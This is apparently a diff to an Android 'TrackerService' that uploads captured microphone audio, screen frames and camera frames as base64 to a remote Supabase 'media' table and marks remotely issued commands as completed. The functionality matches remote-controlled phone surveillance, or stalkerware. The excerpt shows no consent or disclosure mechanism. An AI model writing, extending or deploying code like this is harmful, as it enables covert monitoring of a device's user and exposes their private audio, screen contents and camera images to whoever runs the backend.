@@ -622,6 +622,21 @@ class TrackerService : Service(), LifecycleOwner {
         })
     }
 
+    private fun markCommandCompleted(cmdId: String) {
+        val json = JSONObject().apply {
+            put("status", "completed")
+        }
+        val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
+        val request = Request.Builder()
+            .url("$supabaseUrl/rest/v1/commands?id=eq.$cmdId")
+            .patch(requestBody)
+            .build()
+        client.newCall(request).enqueue(object : Callback {
+            override fun onFailure(call: Call, e: IOException) {}
+            override fun onResponse(call: Call, response: Response) { response.close() }
+        })
+    }
+
     private fun startLiveAudioStream() {
         if (isLiveStreamingAudio) return
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
@@ -770,14 +785,15 @@ class TrackerService : Service(), LifecycleOwner {
     private fun uploadAudioSnippet(b64Audio: String, durationSec: Int, mimeType: String = "audio/mp4") {
         val json = JSONObject().apply {
             put("device_id", deviceName)
-            put("audio_b64", b64Audio)
+            put("type", "audio")
+            put("data_b64", b64Audio)
             put("mime_type", mimeType)
             put("duration_sec", durationSec)
         }
 
         val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
         val request = Request.Builder()
-            .url("$serverUrl/api/audio/upload")
+            .url("$supabaseUrl/rest/v1/media")
             .post(requestBody)
             .build()
 
@@ -940,12 +956,13 @@ class TrackerService : Service(), LifecycleOwner {
         
         val json = JSONObject().apply {
             put("device_id", deviceName)
-            put("frame_b64", b64Image)
+            put("type", "screen")
+            put("data_b64", b64Image)
         }
 
         val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
         val request = Request.Builder()
-            .url("$serverUrl/api/screen/upload")
+            .url("$supabaseUrl/rest/v1/media")
             .post(requestBody)
             .build()
 
@@ -1033,12 +1050,13 @@ class TrackerService : Service(), LifecycleOwner {
 
         val json = JSONObject().apply {
             put("device_id", deviceName)
-            put("frame_b64", b64Image)
+            put("type", "camera")
+            put("data_b64", b64Image)
         }
 
         val requestBody = json.toString().toRequestBody("application/json; charset=utf-8".toMediaType())
         val request = Request.Builder()
-            .url("$serverUrl/api/camera/upload")
+            .url("$supabaseUrl/rest/v1/media")
             .post(requestBody)
             .build()
 
